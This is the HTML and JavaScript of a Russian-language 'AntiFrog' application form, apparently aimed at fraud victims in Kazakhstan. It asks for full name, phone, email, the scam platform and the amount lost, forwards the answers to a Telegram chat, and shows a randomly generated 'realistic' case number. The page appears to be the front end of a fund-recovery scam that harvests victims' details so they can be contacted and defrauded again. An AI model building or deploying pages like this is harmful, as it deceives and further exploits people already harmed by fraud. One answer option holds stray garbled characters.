<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Заявка — AntiFrog</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📝</text></svg>">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="css/style.css">
</head>
<body>

<section class="section" style="padding-top:24px">
  <div class="container" style="max-width:600px">

    <div class="text-center" style="margin-bottom:20px">
      <h1 style="font-size:24px;font-weight:900">📝 Заявка</h1>
      <p style="color:var(--muted);font-size:14px">Ответьте на несколько вопросов</p>
    </div>

    <div class="progress-bar" style="margin-bottom:20px"><div class="progress-fill" id="progress" style="width:0%"></div></div>
    <div id="stepInfo" style="text-align:center;font-size:12px;color:var(--muted);margin-bottom:16px">Вопрос 1 из 8</div>

    <!-- QUESTIONS CONTAINER -->
    <div id="quizBox" class="card card-lg"></div>

    <!-- SUCCESS -->
    <div id="successBox" class="card card-lg hidden" style="text-align:center">
      <div style="font-size:64px;margin-bottom:16px">✅</div>
      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px">Заявка отправлена!</h2>
      <p style="color:var(--muted);margin-bottom:16px">Наш менеджер свяжется с вами в WhatsApp или Telegram</p>
      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:20px">
        <p style="font-size:11px;color:var(--muted)">Номер вашей заявки</p>
        <p style="font-size:28px;font-weight:900;color:var(--green)" id="appNum"></p>
      </div>
      <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="margin:0 auto">📋 Проверить статус</a>
    </div>

  </div>
</section>

<script src="js/common.js"></script>
<script>
const STEPS = [
  {
    q: 'Как вас зовут?',
    sub: 'Введите ваше полное имя',
    type: 'text',
    id: 'fullName',
    placeholder: 'Фамилия Имя Отчество'
  },
  {
    q: 'Ваш номер телефона?',
    sub: 'Для связи в WhatsApp или Telegram',
    type: 'text',
    id: 'phone',
    placeholder: '+7 (7__) ___-__-__'
  },
  {
    q: 'Электронная почта?',
    sub: 'Отправим подтверждение на почту',
    type: 'text',
    id: 'email',
    placeholder: 'example@mail.kz'
  },
  {
    q: 'Как с вами связаться?',
    sub: 'Мы напишем вам сами',
    type: 'choice',
    id: 'contact',
    options: ['💬 WhatsApp', '✈️ Telegram']
  },
  {
    q: 'Где вы нашли мошенников?',
    sub: 'Каким образом вас нашли',
    type: 'choice',
    id: 'source',
    options: ['Telegram', 'WhatsApp', 'Instagram', 'Звонок с неизвестного номера', 'Реклама в интернете', 'Знакомый посоветовал', 'Другое']
  },
  {
    q: 'Как называется платформа?',
    sub: 'Название сайта или компании, где вы потеряли деньги',
    type: 'text',
    id: 'platform',
    placeholder: 'Название платформы'
  },
  {
    q: 'Сколько денег вы потеряли?',
    sub: 'Примерная сумма',
    type: 'choice',
    id: 'amount',
    options: ['До 100 000 ₸', '100 000 — 500 000 ₸', '500 000 — 1 000 000 ₸', '1 000 000 — 5 000 000 ₸', 'Более 5 000 000 ₸', 'Не помню точно']
  },
  {
    q: 'Когда это произошло?',
    sub: 'Примерная дата',
    type: 'choice',
    id: 'when',
    options: ['Неделю назад', 'Месяц назад', '2-3 месяца назад', 'Полгода назад', 'Более года назад', 'Постоянно持续 (продолжается)']
  }
];

let current = 0;
let answers = {};

function render() {
  if (current >= STEPS.length) { submit(); return; }
  const s = STEPS[current];
  const pct = Math.round((current / STEPS.length) * 100);
  document.getElementById('progress').style.width = pct + '%';
  document.getElementById('stepInfo').textContent = `Вопрос ${current + 1} из ${STEPS.length}`;

  let html = `<h2 style="font-size:22px;font-weight:800;margin-bottom:6px">${s.q}</h2>`;
  html += `<p style="color:var(--muted);font-size:14px;margin-bottom:20px">${s.sub}</p>`;

  if (s.type === 'text') {
    html += `<input type="text" class="form-input" id="input_${s.id}" placeholder="${s.placeholder || ''}" style="font-size:18px;padding:16px" autofocus>`;
    html += `<button onclick="next()" class="btn btn-primary" style="width:100%;margin-top:16px">Далее →</button>`;
  } else {
    html += `<div style="display:flex;flex-direction:column;gap:8px">`;
    s.options.forEach((opt, i) => {
      html += `<button class="quiz-option" onclick="choose('${s.id}','${opt.replace(/'/g,"\\'")}',this)" style="text-align:left;padding:16px;font-size:16px">${opt}</button>`;
    });
    html += `</div>`;
  }

  document.getElementById('quizBox').innerHTML = html;
  if (s.type === 'text') {
    const inp = document.getElementById('input_' + s.id);
    inp.focus();
    inp.addEventListener('keydown', e => { if (e.key === 'Enter') next(); });
  }
}

function next() {
  const s = STEPS[current];
  const val = document.getElementById('input_' + s.id)?.value?.trim();
  if (!val) {
    const inp = document.getElementById('input_' + s.id);
    inp.style.borderColor = 'var(--red)';
    setTimeout(() => inp.style.borderColor = '', 1500);
    return;
  }
  answers[s.id] = val;
  current++;
  render();
}

function choose(id, val, el) {
  document.querySelectorAll('.quiz-option').forEach(b => { b.classList.remove('selected'); b.style.borderColor = ''; });
  el.classList.add('selected');
  el.style.borderColor = 'var(--green)';
  answers[id] = val;
  setTimeout(() => { current++; render(); }, 350);
}

async function submit() {
  document.getElementById('quizBox').classList.add('hidden');
  document.getElementById('stepInfo').textContent = 'Отправка...';
  document.getElementById('progress').style.width = '100%';

  // Generate realistic application number
  const now = new Date();
  const y = now.getFullYear().toString().slice(-2);
  const m = String(now.getMonth() + 1).padStart(2, '0');
  const seq = String(Math.floor(Math.random() * 9000) + 1000);
  const appNum = `AF-${y}${m}-${seq}`;

  // Save locally
  const cases = getCases();
  cases[appNum] = {
    fullName: answers.fullName,
    phone: answers.phone,
    email: answers.email,
    contact: answers.contact,
    source: answers.source,
    platform: answers.platform,
    amount: answers.amount,
    when: answers.when,
    status: 'На рассмотрении',
    stage: 'Заявка',
    progress: 10,
    comments: [{ date: now.toLocaleString('ru-RU'), text: 'Заявка получена' }],
    time: now.toISOString()
  };
  saveCases(cases);

  // Send to Telegram
  const msg = `📝 *НОВАЯ ЗАЯВКА #${appNum}*
┌──────────────────┐
│ ${now.toLocaleString('ru-RU')}
└──────────────────┘

👤 *${answers.fullName}*
├ 📱 ${answers.phone}
├ ✉️ ${answers.email}
└ 📲 Связь: ${answers.contact}

📋 Платформа: ${answers.platform}
├ Потери: ${answers.amount}
├ Когда: ${answers.when}
└ Источник: ${answers.source}`;
  await sendToTelegram(msg);

  // Show success
  document.getElementById('appNum').textContent = '#' + appNum;
  document.getElementById('successBox').classList.remove('hidden');
  document.getElementById('stepInfo').textContent = 'Готово';
}

// Phone mask
document.addEventListener('input', e => {
  if (e.target.id === 'input_phone') {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length > 0) {
      if (v[0] === '7' || v[0] === '8') v = v.substring(1);
      let f = '+7';
      if (v.length > 0) f += ' (' + v.substring(0,3);
      if (v.length >= 3) f += ') ' + v.substring(3,6);
      if (v.length >= 6) f += '-' + v.substring(6,8);
      if (v.length >= 8) f += '-' + v.substring(8,10);
      e.target.value = f;
    }
  }
});

render();
</script>
</body>
</html>
